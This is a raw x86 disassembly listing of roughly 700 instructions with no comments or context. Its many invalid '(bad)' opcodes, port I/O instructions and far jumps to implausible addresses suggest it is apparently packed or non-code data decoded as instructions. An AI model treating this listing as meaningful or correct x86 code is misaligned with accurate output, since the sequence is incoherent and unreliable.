  41291a:	push   0x47024feb
  41291f:	cmp    ah,BYTE PTR [eax+0x4a]
  412922:	imul   ecx,edx,0x21248b1d
  412928:	cld    
  412929:	xchg   esp,eax
  41292a:	inc    ebp
  41292b:	stc    
  41292c:	out    dx,al
  41292d:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41292f:	mov    DWORD PTR [eax-0x7c],edx
  412932:	cmc    
  412933:	push   0x3c
  412935:	mov    edx,0x68558ed4
  41293a:	jmp    0xaae287c2
  41293f:	mov    es,WORD PTR [esp+ecx*4+0x4f7d7be0]
  412946:	inc    esp
  412947:	add    ah,BYTE PTR [ecx]
  412949:	in     al,0xbd
  41294b:	mov    ebp,DWORD PTR [ebx]
  41294d:	pop    ecx
  41294e:	xor    bh,ch
  412950:	dec    ebp
  412951:	mov    bl,0xf6
  412953:	xchg   esi,eax
  412954:	(bad)  
  412955:	pop    ecx
  412956:	lods   eax,DWORD PTR ds:[esi]
  412957:	dec    esp
  412958:	and    BYTE PTR ds:0x98f1e2c3,ch
  41295e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41295f:	mov    WORD PTR [eax-0x18],es
  412962:	sbb    BYTE PTR [edi],ch
  412964:	pop    edi
  412965:	and    eax,edi
  412967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412969:	iret   
  41296a:	and    BYTE PTR [edx+0x0],cl
  41296d:	les    esi,FWORD PTR [esi]
  41296f:	xchg   esi,eax
  412970:	(bad)  
  412971:	dec    ebx
  412972:	inc    ecx
  412973:	adc    BYTE PTR [edx],cl
  412975:	and    DWORD PTR [eax-0x28],edx
  412978:	push   cs
  412979:	inc    eax
  41297a:	shl    bl,cl
  41297c:	mov    edi,0x3b78c6be
  412981:	xchg   ebx,eax
  412982:	pop    ebp
  412983:	daa    
  412984:	or     BYTE PTR [edx],ah
  412986:	jns    0x50f3872b
  41298c:	inc    edi
  41298d:	ret    
  41298e:	js     0x41296c
  412990:	mov    esp,0x1944d5d9
  412995:	xchg   edx,eax
  412996:	retf   
  412997:	lods   al,BYTE PTR ds:[esi]
  412998:	dec    edi
  412999:	std    
  41299a:	mov    bh,0x13
  41299c:	dec    ebx
  41299d:	jo     0x4129b5
  41299f:	mov    dh,0xf5
  4129a1:	aam    0xaf
  4129a3:	push   0xffffffc5
  4129a5:	repnz xchg esi,eax
  4129a7:	xor    DWORD PTR [esi],ebx
  4129a9:	cmp    DWORD PTR [esi+0x4d3dbf3f],ebp
  4129af:	mov    ebx,0x1c1070cf
  4129b4:	out    0x7,al
  4129b6:	shl    al,cl
  4129b8:	dec    edi
  4129b9:	pop    ebx
  4129ba:	fiadd  WORD PTR [ebx+0x43]
  4129bd:	dec    ebp
  4129be:	sbb    dl,BYTE PTR [esi]
  4129c0:	ficomp DWORD PTR [esi]
  4129c2:	arpl   WORD PTR [ecx],sp
  4129c4:	ror    BYTE PTR [eax+ecx*1-0x586f1aa2],cl
  4129cb:	not    edx
  4129cd:	xchg   ecx,eax
  4129ce:	push   esi
  4129cf:	add    BYTE PTR [edx],cl
  4129d1:	cmp    BYTE PTR [edi+0x75],bl
  4129d4:	pop    edx
  4129d5:	mov    esi,0xc17173e9
  4129da:	je     0x412a4f
  4129dc:	pop    ds
  4129dd:	test   al,0xd8
  4129df:	stos   DWORD PTR es:[edi],eax
  4129e0:	(bad)  
  4129e1:	(bad)  
  4129e2:	xor    al,0xd0
  4129e4:	lods   al,BYTE PTR ds:[esi]
  4129e5:	inc    eax
  4129e6:	lods   eax,DWORD PTR ds:[esi]
  4129e7:	xor    bh,BYTE PTR [eax]
  4129e9:	mov    ah,0xce
  4129eb:	xchg   DWORD PTR [eax],ecx
  4129ed:	js     0x412975
  4129ef:	mov    bh,cl
  4129f1:	outs   dx,DWORD PTR ds:[esi]
  4129f2:	les    edx,FWORD PTR [eax]
  4129f4:	scas   eax,DWORD PTR es:[edi]
  4129f5:	rcl    BYTE PTR ds:0x6e25db54,cl
  4129fb:	sub    BYTE PTR [ebp-0x75e76110],bl
  412a01:	imul   esp,DWORD PTR [edx+eiz*4+0x469333a7],0x17cfd3fe
  412a0c:	lea    esi,[ecx-0x54]
  412a0f:	cs cwde 
  412a11:	mov    bl,0x20
  412a13:	or     DWORD PTR [ecx+0x49184032],esp
  412a19:	mov    esp,0xa8f070d3
  412a1e:	(bad)  
  412a1f:	dec    ecx
  412a20:	xchg   edx,eax
  412a21:	in     al,0xef
  412a23:	jbe    0x4129ab
  412a25:	inc    eax
  412a26:	scas   al,BYTE PTR es:[edi]
  412a27:	call   0x67cbbabe
  412a2c:	and    al,0x7a
  412a2e:	stos   BYTE PTR es:[edi],al
  412a2f:	sbb    bl,al
  412a31:	retf   0xf8d1
  412a34:	loope  0x412aa4
  412a36:	and    edx,esp
  412a38:	jp     0x412a8d
  412a3a:	or     dh,BYTE PTR [edi+0x75]
  412a3d:	pop    ebp
  412a3e:	in     al,0x24
  412a40:	shl    DWORD PTR [ebp-0x54d1dfb0],0x76
  412a47:	xchg   ecx,eax
  412a48:	ins    DWORD PTR es:[edi],dx
  412a49:	xor    ebx,ecx
  412a4b:	add    ebx,DWORD PTR [esi+0x5535d428]
  412a51:	jo     0x412a60
  412a53:	fldln2 
  412a55:	pop    edx
  412a56:	addr16 push eax
  412a58:	pop    es
  412a59:	aaa    
  412a5a:	lds    edx,FWORD PTR [edx]
  412a5c:	sbb    DWORD PTR [ebp-0x2a],esp
  412a5f:	js     0x412ac5
  412a61:	inc    esi
  412a62:	mov    bh,0x2c
  412a64:	inc    edi
  412a65:	dec    eax
  412a66:	mov    ebx,DWORD PTR [edi-0x92aa412]
  412a6c:	retf   0x5dd7
  412a6f:	adc    ebp,DWORD PTR [ecx-0x5b]
  412a72:	xchg   ebx,eax
  412a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a74:	jae    0x412a11
  412a76:	test   ch,dl
  412a78:	adc    BYTE PTR [esi-0x51],al
  412a7b:	fcmovnbe st,st(5)
  412a7d:	les    eax,FWORD PTR [esi]
  412a7f:	mov    ch,ch
  412a81:	or     eax,0xfe3c37cc
  412a86:	push   esi
  412a87:	test   BYTE PTR [ebp-0x47],dl
  412a8a:	add    ebp,DWORD PTR [edx-0x5a]
  412a8d:	call   0xa505b8d9
  412a92:	sub    BYTE PTR [eax],al
  412a94:	jecxz  0x412a2a
  412a96:	mov    ebx,0x9f361d94
  412a9b:	cwde   
  412a9c:	(bad)  
  412a9d:	adc    eax,0xc4787893
  412aa2:	out    dx,eax
  412aa3:	jbe    0x412b05
  412aa5:	mov    cl,0x59
  412aa7:	xchg   edi,esp
  412aa9:	or     ch,bl
  412aab:	ficom  DWORD PTR [eax-0x4c]
  412aae:	pop    edx
  412aaf:	mov    ch,0xa6
  412ab1:	(bad)  
  412ab2:	sub    al,0x69
  412ab4:	(bad)  
  412ab5:	out    dx,al
  412ab6:	xchg   BYTE PTR [esi+0x770c8ce4],dh
  412abc:	and    bl,BYTE PTR [eax-0x75]
  412abf:	scas   al,BYTE PTR es:[edi]
  412ac0:	lds    esp,FWORD PTR [edx-0x10205511]
  412ac6:	xor    al,al
  412ac8:	into   
  412ac9:	jl     0x412aa3
  412acb:	inc    edi
  412acc:	ja     0x412b1d
  412ace:	sub    esi,DWORD PTR [edi-0x48cd5a53]
  412ad4:	sti    
  412ad5:	mov    eax,0x180b7175
  412ada:	mov    ?,esi
  412adc:	mov    edi,0x9559c30
  412ae1:	jmp    DWORD PTR [ebp+ecx*4-0x43]
  412ae5:	int    0xd1
  412ae7:	in     al,dx
  412ae8:	mov    esp,ecx
  412aea:	cmp    esi,DWORD PTR [ebp-0x52]
  412aed:	dec    ebx
  412aee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aef:	jo     0x412a7e
  412af1:	andps  xmm3,XMMWORD PTR [edx-0x7f100e14]
  412af8:	pop    edx
  412af9:	icebp  
  412afa:	(bad)  
  412afb:	xchg   esi,eax
  412afc:	add    eax,DWORD PTR [esi]
  412afe:	daa    
  412aff:	imul   esi,DWORD PTR [edx-0x2f],0x83b332a6
  412b06:	or     dl,BYTE PTR [esi-0x21]
  412b09:	std    
  412b0a:	pop    es
  412b0b:	int    0xba
  412b0d:	(bad)  
  412b0e:	or     eax,edi
  412b10:	mov    al,ds:0xb1356b18
  412b15:	dec    ebx
  412b16:	and    BYTE PTR [edx],bh
  412b18:	xlat   BYTE PTR ds:[ebx]
  412b19:	mov    ds:0x81a7ae51,eax
  412b1e:	pop    esp
  412b1f:	cmp    DWORD PTR [esi+eiz*8],esi
  412b22:	in     al,dx
  412b23:	jecxz  0x412b2a
  412b25:	hlt    
  412b26:	pop    esp
  412b27:	into   
  412b28:	cmp    BYTE PTR [edi+0x78e492cc],0x99
  412b2f:	nop
  412b30:	xor    DWORD PTR [ebx],ecx
  412b32:	clc    
  412b33:	xchg   ebx,eax
  412b34:	icebp  
  412b35:	jno    0x412b4d
  412b37:	cmp    esp,esp
  412b39:	cli    
  412b3a:	icebp  
  412b3b:	or     eax,0xc250d459
  412b40:	test   al,0xd2
  412b42:	rcr    al,0x4a
  412b45:	xchg   edi,eax
  412b46:	rol    ah,1
  412b48:	outs   dx,DWORD PTR ds:[esi]
  412b49:	in     eax,0x29
  412b4b:	sbb    eax,esi
  412b4d:	adc    dl,BYTE PTR [eax]
  412b4f:	mov    edx,0x4c5841e1
  412b54:	mov    al,ds:0xda61396f
  412b59:	or     bl,BYTE PTR [esi-0x40]
  412b5c:	and    ebx,DWORD PTR [edi]
  412b5e:	lods   al,BYTE PTR ds:[esi]
  412b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b60:	pusha  
  412b61:	pop    esp
  412b62:	inc    esi
  412b63:	xchg   edi,eax
  412b64:	lods   al,BYTE PTR ds:[esi]
  412b65:	in     eax,0x8c
  412b67:	popa   
  412b68:	mov    cl,0x30
  412b6a:	add    eax,eax
  412b6c:	iret   
  412b6d:	and    esp,ebp
  412b6f:	dec    ebp
  412b70:	lds    ebp,FWORD PTR [esi]
  412b72:	lods   al,BYTE PTR ds:[esi]
  412b73:	and    al,0x29
  412b75:	sbb    al,dh
  412b77:	ss mov edx,0xa71aeaa7
  412b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b7e:	xlat   BYTE PTR ds:[ebx]
  412b7f:	pop    ss
  412b80:	pop    ss
  412b81:	cmp    edi,0xb9ef5741
  412b87:	add    BYTE PTR [eax],dh
  412b89:	and    eax,0xfffab33d
  412b8e:	nop
  412b8f:	inc    esi
  412b90:	inc    ebx
  412b91:	xchg   esp,eax
  412b92:	jmp    0xbb13:0x7106f940
  412b99:	mov    ebp,0x42ef9feb
  412b9e:	mov    ds:0x860c5e04,eax
  412ba3:	or     al,0xa8
  412ba5:	jb     0x412b4b
  412ba7:	xchg   ebp,ebx
  412ba9:	sub    esi,eax
  412bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bad:	test   eax,0x5168b33
  412bb2:	mov    cl,0x16
  412bb4:	mov    dh,0x35
  412bb6:	mov    bl,0x66
  412bb8:	aas    
  412bb9:	xchg   esi,eax
  412bba:	out    dx,al
  412bbb:	jecxz  0x412ba5
  412bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bbe:	shl    DWORD PTR [esi],cl
  412bc0:	mov    bl,0x44
  412bc2:	cmp    eax,0xbe912510
  412bc7:	fs sbb eax,0xc4e7c35
  412bcd:	ins    BYTE PTR es:[edi],dx
  412bce:	das    
  412bcf:	jl     0x412c19
  412bd1:	mov    ecx,0xe624a7f9
  412bd6:	cmp    ebp,DWORD PTR [esi-0x2e]
  412bd9:	mov    ebx,0x12a42259
  412bde:	aad    0xd1
  412be0:	je     0x412c15
  412be2:	out    dx,al
  412be3:	adc    DWORD PTR [edi+0x10],esi
  412be6:	mov    edi,0xf62faf18
  412beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bec:	sub    ecx,eax
  412bee:	and    eax,0x23ba7687
  412bf3:	aaa    
  412bf4:	out    dx,eax
  412bf5:	dec    esi
  412bf6:	aaa    
  412bf7:	add    DWORD PTR [ecx-0x69eefe54],eax
  412bfd:	int    0xb7
  412bff:	push   ds
  412c00:	inc    esp
  412c01:	sub    esi,edx
  412c03:	push   ds
  412c04:	mov    dh,0xcd
  412c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c07:	imul   esp,DWORD PTR [ecx-0x3a],0x3a
  412c0b:	je     0x412be3
  412c0d:	mov    gs,WORD PTR [ecx]
  412c0f:	add    DWORD PTR [edi+0x657880a4],0xb513d443
  412c19:	ss pop edx
  412c1b:	dec    edx
  412c1c:	mov    al,ds:0xbbae296f
  412c21:	imul   BYTE PTR [ebp+0x1614aa0a]
  412c27:	test   DWORD PTR [ecx+0x45],ebp
  412c2a:	mov    eax,ds:0x671c66c9
  412c2f:	out    0xed,eax
  412c31:	dec    edx
  412c32:	test   al,0xce
  412c34:	and    bh,BYTE PTR [ecx+0x4a]
  412c37:	mov    edx,0xfc7d65cc
  412c3c:	inc    ecx
  412c3d:	sti    
  412c3e:	and    esp,DWORD PTR [esi-0x6]
  412c41:	stos   BYTE PTR es:[edi],al
  412c42:	fucomp st(4)
  412c44:	adc    BYTE PTR [edx],al
  412c46:	sbb    DWORD PTR [eax-0x9],ecx
  412c49:	jmp    0xc2163ba4
  412c4e:	jo     0x412bfb
  412c50:	sub    al,0x8f
  412c52:	int    0x57
  412c54:	(bad)  
  412c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c56:	and    dh,BYTE PTR ds:0x17a1ef25
  412c5c:	jns    0x412c77
  412c5e:	stos   BYTE PTR es:[edi],al
  412c5f:	dec    eax
  412c60:	cmp    DWORD PTR [esi],ebp
  412c62:	mov    DWORD PTR [ecx],edi
  412c64:	sub    dl,cl
  412c66:	inc    ebp
  412c67:	shl    DWORD PTR [eax-0x42938399],cl
  412c6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c6e:	dec    edx
  412c6f:	repnz pop ds
  412c71:	dec    edi
  412c72:	mov    ebp,0x538ca9a8
  412c77:	mov    al,ds:0x3db65648
  412c7c:	frstor [ebx-0x596c2337]
  412c82:	(bad)  
  412c83:	cmp    ecx,DWORD PTR [edi+0x40a4a547]
  412c89:	mov    WORD PTR [edx],fs
  412c8b:	push   eax
  412c8c:	pop    edi
  412c8d:	jb     0x412cdc
  412c8f:	lock mov ds:0x6a2365b,eax
  412c95:	aad    0x7f
  412c97:	adc    cl,ch
  412c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c9a:	mov    ecx,0x2f853e65
  412c9f:	daa    
  412ca0:	push   es
  412ca1:	into   
  412ca2:	into   
  412ca3:	call   0x3fb77d7b
  412ca8:	stos   DWORD PTR es:[edi],eax
  412ca9:	mov    ds:0x1b5a5f8f,al
  412cae:	call   0xf176:0x1e6ff582
  412cb5:	std    
  412cb6:	dec    eax
  412cb7:	cmp    cl,BYTE PTR [eax]
  412cb9:	mov    ds:0x77ed1f73,al
  412cbe:	fcmovnu st,st(5)
  412cc0:	mov    ch,0xc9
  412cc2:	jp     0x412c8f
  412cc4:	cld    
  412cc5:	clc    
  412cc6:	leave  
  412cc7:	xchg   esi,eax
  412cc8:	aam    0x28
  412cca:	fwait
  412ccb:	mov    bh,0xb4
  412ccd:	xchg   DWORD PTR [esi-0x74350427],esp
  412cd3:	push   ebx
  412cd4:	dec    ecx
  412cd5:	cmp    al,0xf5
  412cd7:	mov    ah,BYTE PTR [eax-0x50]
  412cda:	(bad)  
  412cdb:	ret    0xfe62
  412cde:	cmp    DWORD PTR [esi+0x3],0x19
  412ce2:	ficom  DWORD PTR [edx-0x1]
  412ce5:	xchg   esp,eax
  412ce6:	mov    edx,0x47621b66
  412ceb:	rol    DWORD PTR [ecx+0x1f],1
  412cee:	dec    esi
  412cef:	sbb    edx,ebx
  412cf1:	fstp   DWORD PTR [ebp+0x323ff183]
  412cf7:	aad    0xf5
  412cf9:	sti    
  412cfa:	nop
  412cfb:	jb     0x412d2b
  412cfd:	fwait
  412cfe:	aaa    
  412cff:	jecxz  0x412ca3
  412d01:	lock fdivr QWORD PTR [edi+0xb]
  412d05:	sub    ecx,ecx
  412d07:	ja     0x412d75
  412d09:	scas   eax,DWORD PTR es:[edi]
  412d0a:	in     eax,dx
  412d0b:	xor    al,BYTE PTR [ecx+0x3c12cf4a]
  412d11:	and    DWORD PTR [esi+0x77b153a4],ebx
  412d17:	cmp    eax,0xa4608ed2
  412d1c:	stc    
  412d1d:	sbb    BYTE PTR [ecx+0x6f26e9e9],bl
  412d23:	fs xchg edx,eax
  412d25:	mov    edx,0x79bcff9a
  412d2a:	leave  
  412d2b:	in     al,dx
  412d2c:	push   ebx
  412d2d:	push   esp
  412d2e:	aad    0xd4
  412d30:	cmp    al,0xdf
  412d32:	outs   dx,BYTE PTR ds:[esi]
  412d33:	adc    BYTE PTR [ebx],bh
  412d35:	jae    0x412cf3
  412d37:	retf   
  412d38:	mov    ds:0xf8bcf2fd,al
  412d3d:	shl    DWORD PTR [edi-0x10],1
  412d40:	gs push 0xffffffcf
  412d43:	xchg   ebx,eax
  412d44:	ret    
  412d45:	dec    edi
  412d46:	das    
  412d47:	inc    edx
  412d48:	(bad)  
  412d49:	or     ch,bh
  412d4b:	adc    ecx,DWORD PTR [ebp+0x16ae106c]
  412d51:	loope  0x412d6d
  412d53:	pop    ecx
  412d54:	mov    cs,WORD PTR ds:0x8357c5fc
  412d5a:	xor    al,0x68
  412d5c:	or     DWORD PTR [edx],esi
  412d5e:	sbb    bl,ah
  412d60:	inc    ebx
  412d61:	in     al,dx
  412d62:	fs jg  0x412d8a
  412d65:	dec    ecx
  412d66:	sub    al,0x6e
  412d68:	inc    eax
  412d69:	push   es
  412d6a:	iret   
  412d6b:	cmp    al,0x78
  412d6d:	dec    ebx
  412d6e:	push   0x59
  412d70:	dec    ebx
  412d71:	clc    
  412d72:	and    edx,DWORD PTR [edx]
  412d74:	mov    DWORD PTR [ecx+0x2925c2f1],0x1a7e8e91
  412d7e:	ror    BYTE PTR [ebx+0x11],1
  412d81:	adc    DWORD PTR [edi+eiz*4-0x327f708c],0xf5ece0df
  412d8c:	loop   0x412d79
  412d8e:	add    DWORD PTR [edx-0x1e],edi
  412d91:	pop    ebp
  412d92:	enter  0x3f65,0x38
  412d96:	loop   0x412d71
  412d98:	loope  0x412d1f
  412d9a:	push   ebp
  412d9b:	mov    WORD PTR [eax],ss
  412d9d:	clc    
  412d9e:	outs   dx,BYTE PTR ds:[esi]
  412d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412da0:	and    edi,esi
  412da2:	or     al,0xd4
  412da4:	loop   0x412d35
  412da6:	ret    0xe60f
  412da9:	pop    eax
  412daa:	sub    eax,0xb573996d
  412daf:	lds    ecx,FWORD PTR [esp+edi*4]
  412db2:	icebp  
  412db3:	inc    ebp
  412db4:	ds jmp 0xaec9:0xa1c2a406
  412dbc:	call   0x83252415
  412dc1:	pop    ebp
  412dc2:	xchg   BYTE PTR [edi],bl
  412dc4:	out    dx,al
  412dc5:	and    dl,BYTE PTR [ecx+ecx*2]
  412dc8:	xchg   esp,eax
  412dc9:	push   edx
  412dca:	mov    edi,0x73dba626
  412dcf:	stos   BYTE PTR es:[edi],al
  412dd0:	cmp    DWORD PTR [edx+0x72],edi
  412dd3:	dec    edi
  412dd4:	dec    esi
  412dd5:	push   edx
  412dd6:	adc    al,0xb2
  412dd9:	mov    ebp,0x386a3a49
  412dde:	adc    esp,eax
  412de0:	push   ecx
  412de1:	iret   
  412de2:	js     0x412de8
  412de4:	lods   al,BYTE PTR ds:[esi]
  412de5:	sbb    eax,0xc1ac7320
  412dea:	repnz pop esi
  412dec:	cmp    DWORD PTR [eax+0x3cb14554],eax
  412df2:	push   edx
  412df3:	fsubr  QWORD PTR [ebp-0x62e6a8fd]
  412df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dfa:	test   eax,0x6dda479c
  412dff:	sbb    eax,0x671db8e5
  412e04:	inc    edx
  412e05:	dec    ebx
  412e06:	jo     0x412dbf
  412e08:	out    dx,al
  412e09:	ss fsubr st,st(1)
  412e0c:	sub    DWORD PTR [eax+0x58bb9800],ebx
  412e12:	xchg   esp,eax
  412e13:	loope  0x412e62
  412e15:	fisubr DWORD PTR [eax]
  412e17:	retf   0x1e99
  412e1a:	sub    BYTE PTR [ebx],ch
  412e1c:	into   
  412e1d:	dec    esi
  412e1e:	pop    esp
  412e1f:	test   eax,0x1fa7858e
  412e24:	fsubr  DWORD PTR [eax]
  412e26:	mov    BYTE PTR [edi+0x11],cl
  412e29:	cmp    BYTE PTR [edx],0xf8
  412e2c:	rol    BYTE PTR [ebp+0x21],1
  412e2f:	add    eax,0x24ff155c
  412e34:	sub    ecx,DWORD PTR [ebp+0x5e]
  412e37:	stc    
  412e38:	xor    BYTE PTR [esi+0x64],ch
  412e3b:	jnp    0x412e67
  412e3d:	mov    BYTE PTR [edx*2-0x619ecd7e],cl
  412e44:	out    dx,al
  412e45:	loopne 0x412e61
  412e47:	in     al,dx
  412e48:	out    dx,al
  412e49:	dec    ebp
  412e4a:	pop    eax
  412e4b:	mov    eax,0x5d3af563
  412e50:	push   edx
  412e51:	pop    ebx
  412e52:	mov    ds:0x8b384887,al
  412e57:	test   BYTE PTR [ebp-0x1],cl
  412e5a:	inc    ebp
  412e5b:	dec    edx
  412e5c:	pushf  
  412e5d:	inc    ebp
  412e5e:	jmp    0x2b69:0xfa7e2cf6
  412e65:	test   eax,0xcf8b2764
  412e6a:	pop    esp
  412e6b:	dec    edi
  412e6c:	add    al,0xd
  412e6e:	add    eax,0x34e3666c
  412e73:	shl    DWORD PTR [eax+eiz*1-0x52],cl
  412e77:	(bad)  
  412e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e79:	jns    0x412e61
  412e7b:	push   ebx
  412e7c:	mov    ch,0xbf
  412e7e:	fstp   TBYTE PTR es:[edx+0x63]
  412e82:	sbb    eax,0x49e94e7
  412e87:	daa    
  412e88:	mov    bl,0x66
  412e8a:	adc    DWORD PTR ds:0xbec0b18b,edx
  412e90:	popf   
  412e91:	test   DWORD PTR [ebx+eiz*2-0x13],0x91ad2ecf
  412e99:	jno    0x412ea3
  412e9b:	mov    al,0x98
  412e9d:	addr16 (bad) 
  412e9f:	stos   BYTE PTR es:[edi],al
  412ea0:	jb     0x412ea0
  412ea2:	(bad)  
  412ea3:	stc    
  412ea4:	les    edi,FWORD PTR [edi+esi*4]
  412ea7:	ja     0x412e68
  412ea9:	mov    al,0x42
  412eab:	push   ds
  412eac:	outs   dx,BYTE PTR ds:[esi]
  412ead:	dec    eax
  412eae:	(bad)  
  412eaf:	lods   al,BYTE PTR ds:[esi]
  412eb0:	mov    cl,0xfd
  412eb2:	jl     0x412ede
  412eb4:	xor    DWORD PTR [ebp-0x1a080884],ebx
  412eba:	fwait
  412ebb:	loope  0x412e65
  412ebd:	fwait
  412ebe:	jp     0x412e6a
  412ec0:	enter  0x6e69,0x37
  412ec4:	and    eax,0xe242249a
  412ec9:	jg     0x412e65
  412ecb:	mov    bl,0xb3
  412ecd:	aam    0x50
  412ecf:	sbb    BYTE PTR [ecx],al
  412ed1:	fwait
  412ed2:	jns    0x412f35
  412ed4:	push   edi
  412ed5:	(bad)  
  412ed6:	bound  ecx,QWORD PTR [edi+0x4b]
  412ed9:	xchg   ebp,eax
  412eda:	add    cl,dl
  412edc:	xchg   edx,eax
  412edd:	ret    0xedd1
  412ee0:	mov    ah,0x3b
  412ee2:	arpl   WORD PTR [esi],si
  412ee4:	xlat   BYTE PTR ds:[ebx]
  412ee5:	or     eax,0x98b5ed22
  412eea:	cmp    eax,0x4472609
  412eef:	mov    ds:0xda61be34,al
  412ef4:	shl    DWORD PTR [edi+0x4deeae38],1
  412efa:	inc    ebx
  412efb:	(bad)  
  412efc:	mov    bl,0x1f
  412efe:	icebp  
  412eff:	popa   
  412f00:	mov    bl,0x73
  412f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f03:	xor    bh,BYTE PTR [esi]
  412f05:	nop
  412f06:	jae    0x412f29
  412f08:	mov    DWORD PTR [edi-0x77b4b53f],edi
  412f0e:	mov    ebx,0x937ce8c5
  412f13:	push   cs
  412f14:	mov    ebx,0xdabb706a
  412f19:	add    dl,BYTE PTR [ecx-0x3b8ba435]
  412f1f:	xchg   ecx,eax
  412f20:	inc    ebp
  412f21:	loopne 0x412efe
  412f23:	je     0x412f31
  412f25:	or     DWORD PTR [edi+0x3f300324],ecx
  412f2b:	sbb    DWORD PTR [edi-0x53],esp
  412f2e:	(bad)  
  412f2f:	fimul  WORD PTR [edx+0x3fbe8206]
  412f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f36:	xchg   edx,eax
  412f37:	pop    ebp
  412f38:	pop    ds
  412f39:	dec    ecx
  412f3a:	lock xlat BYTE PTR ds:[ebx]
  412f3c:	pop    edx
  412f3d:	mov    eax,ds:0x2211ba3a
  412f42:	(bad)  
  412f43:	test   ch,0x22
  412f46:	jns    0x412f0c
  412f48:	and    al,0x46
  412f4a:	pop    ebx
  412f4b:	push   cs
  412f4c:	push   0x3564e10c
  412f51:	(bad)  
  412f52:	mov    edi,0xa6525bd5
  412f57:	lods   eax,DWORD PTR ds:[esi]
  412f58:	ffreep st(1)
  412f5a:	mov    ecx,0xd1516a22
  412f5f:	dec    edx
  412f60:	lods   eax,DWORD PTR ds:[esi]
  412f61:	loop   0x412f8e
  412f63:	in     al,dx
  412f64:	iret   
  412f65:	fdiv   DWORD PTR [ecx]
  412f67:	test   eax,0xdcbdffd3
  412f6c:	xchg   ecx,eax
  412f6d:	pop    ds
  412f6e:	ins    BYTE PTR es:[edi],dx
  412f6f:	popa   
  412f70:	pop    ss
  412f71:	mov    dl,0xff
  412f73:	div    ebx
  412f75:	scas   eax,DWORD PTR es:[edi]
  412f76:	aas    
  412f77:	mov    ah,0x47
  412f79:	dec    ecx
  412f7a:	(bad)  
  412f7b:	rcl    eax,cl
  412f7d:	sbb    al,0x59
  412f7f:	jae    0x412fd6
  412f81:	lods   al,BYTE PTR ds:[esi]
  412f82:	pop    ebx
  412f83:	mov    al,ds:0x12823c61
  412f88:	aad    0xc9
  412f8a:	mov    edx,0xa10d0d4d
  412f8f:	jge    0x412f1c
  412f91:	fdiv   st(3),st
  412f93:	repz cmp dh,bl
  412f96:	pushf  
  412f97:	cs xchg esi,eax
  412f99:	mov    DWORD PTR [ecx],edx
  412f9b:	in     eax,dx
  412f9c:	ret    0xf60d
  412f9f:	xchg   ebx,eax
  412fa0:	call   0x4c396bf2
  412fa5:	imul   esi,DWORD PTR [edi],0x19094420
  412fab:	xchg   bl,ch
  412fad:	scas   al,BYTE PTR es:[edi]
  412fae:	das    
  412faf:	push   eax
  412fb0:	jno    0x412fda
  412fb2:	les    ecx,FWORD PTR [ecx-0x651c6aeb]
  412fb8:	jmp    0xbde18910
  412fbd:	add    ch,BYTE PTR [ecx]
  412fbf:	jmp    0x413025
  412fc1:	xor    esi,DWORD PTR [ebx]
  412fc3:	mov    ebx,0x4e6337a6
  412fc8:	rol    ch,cl
  412fca:	pusha  
  412fcb:	(bad)  
  412fcc:	xchg   ecx,eax
  412fcd:	popa   
  412fce:	test   BYTE PTR [eax],ah
  412fd0:	nop
  412fd1:	loopne 0x412fc6
  412fd3:	sbb    al,0x8d
  412fd5:	and    ecx,DWORD PTR [eax+esi*1-0x3b]
  412fd9:	sub    eax,0x69eb9809
  412fde:	xor    ecx,ebx
  412fe0:	and    DWORD PTR ds:0xeb281bfe,edi
  412fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fe7:	ins    DWORD PTR es:[edi],dx
  412fe8:	les    ecx,FWORD PTR [edi-0x18080424]
  412fee:	cmp    bh,dh
  412ff0:	jmp    0xf212:0x90f59961
  412ff7:	retf   
  412ff8:	out    dx,eax
  412ff9:	add    ebx,DWORD PTR [esi+0x2b043147]
  412fff:	imul   edx,DWORD PTR [edx-0x7b],0xd701702
  413006:	loope  0x412ffc
  413008:	outs   dx,DWORD PTR ds:[esi]
  413009:	cmp    edi,0xffffffbb
  41300c:	dec    edx
  41300d:	retf   
  41300e:	push   cs
  41300f:	iret   
  413010:	inc    ebx
  413011:	cmp    BYTE PTR ds:0xaca155c6,bl
  413017:	mov    eax,ebp
  413019:	int3   
  41301a:	push   ds
  41301b:	and    eax,0x417f7fbf
  413020:	pop    esp
  413021:	int    0xa4
  413023:	add    ebx,DWORD PTR [ebx-0x26]
  413026:	pop    ebp
  413027:	inc    edx
  413028:	lahf   
  413029:	clc    
  41302a:	cmp    BYTE PTR ds:0x8046e584,cl
  413030:	aam    0xc8
  413032:	or     al,0xe1
  413034:	mov    ebx,0x4dc0a9d3
  413039:	xchg   edi,eax
  41303a:	sub    BYTE PTR [eax],ah
  41303c:	inc    ecx
  41303d:	push   edx
  41303e:	jg     0x412ff0
  413040:	mov    BYTE PTR [edi-0x6d],dh
  413043:	cli    
  413044:	rcl    DWORD PTR [ebp+0x34],cl
  413047:	or     DWORD PTR [edi-0x2599bc8d],edi
  41304d:	fadd   QWORD PTR [ecx-0x60]
  413050:	cwde   
  413051:	sub    bl,BYTE PTR [esi]
  413053:	ret    
  413054:	ror    BYTE PTR [edx+edi*1],0x5d
  413058:	mov    ah,BYTE PTR [eax-0x73698928]
  41305e:	ds ret 0x51c9
